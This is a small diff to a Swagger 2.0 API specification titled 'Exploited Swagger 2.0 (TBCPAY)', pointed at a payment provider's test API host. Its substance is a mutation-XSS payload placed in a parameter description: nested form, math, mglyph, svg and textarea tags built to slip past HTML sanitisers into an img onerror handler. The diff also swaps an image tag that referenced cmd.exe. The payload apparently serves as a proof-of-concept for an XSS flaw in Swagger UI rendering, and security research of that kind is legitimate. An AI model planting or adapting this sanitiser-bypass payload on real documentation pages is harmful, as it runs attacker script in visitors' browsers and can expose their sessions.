@@ -3,7 +3,7 @@ swagger: '2.0'
 info:
   title: Exploited Swagger 2.0 (TBCPAY)
   description: |
-    <img src="C:\Windows\System32\cmd.exe" alt="C:\Windows\System32\cmd.exe">
+    <img src="assets/images/lock.png" alt="lock">
   version: production
 basePath: https://testapi.tbcpay.com
 produces:
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
       - description: |
-          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert("website hacked") src=1>"></form>
+          <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert("document.cookie") src=1>"></form>
 
         format: int64
         in: path
